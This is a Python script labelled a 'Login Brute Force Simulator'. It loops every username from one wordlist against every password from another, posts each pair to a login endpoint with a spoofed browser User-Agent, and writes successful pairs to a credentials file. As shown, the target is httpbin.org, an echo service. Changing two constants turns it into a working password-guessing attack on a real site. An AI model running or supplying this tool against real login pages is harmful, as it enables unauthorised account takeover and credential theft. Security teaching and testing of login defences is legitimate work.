import requests
import time
from datetime import datetime
import os

LOGIN_URL = "https://httpbin.org/post"

SUCCESS_KEYWORD = "authenticated"

DELAY = 1

HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

VALID_FILE = "valid_credentials.txt"
LOG_FILE = "results/logs.txt"


def load_file(filename):
    with open(filename, "r") as file:
        return [line.strip() for line in file if line.strip()]


def save_valid(username, password):
    with open(VALID_FILE, "a") as file:
        file.write(f"{username}:{password}\n")


def write_log(message):
    with open(LOG_FILE, "a") as file:
        file.write(message + "\n")


def attempt_login(username, password):

    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(
            LOGIN_URL,
            data=data,
            headers=HEADERS,
            timeout=5
        )

        return response

    except requests.exceptions.RequestException as error:
        print(f"[ERROR] {error}")
        return None


def check_response(response, username, password):

    if response is None:
        return False

    if SUCCESS_KEYWORD in response.text.lower():

        print(f"[SUCCESS] Valid Credentials Found -> {username}:{password}")

        save_valid(username, password)

        log = f"[{datetime.now()}] SUCCESS -> {username}:{password}"
        write_log(log)

        return True

    else:

        print(f"[FAILED] {username}:{password}")

        log = f"[{datetime.now()}] FAILED -> {username}:{password}"
        write_log(log)

        return False


def main():

    os.makedirs("results", exist_ok=True)

    print("=" * 60)
    print("Python HTTP Login Brute Force Simulator")
    print("=" * 60)

    usernames = load_file("usernames.txt")
    passwords = load_file("passwords.txt")

    total_attempts = 0

    for username in usernames:

        for password in passwords:

            total_attempts += 1

            response = attempt_login(username, password)

            check_response(response, username, password)

            time.sleep(DELAY)

    print("\nScan Completed")
    print(f"Total Attempts: {total_attempts}")


if __name__ == "__main__":
    main()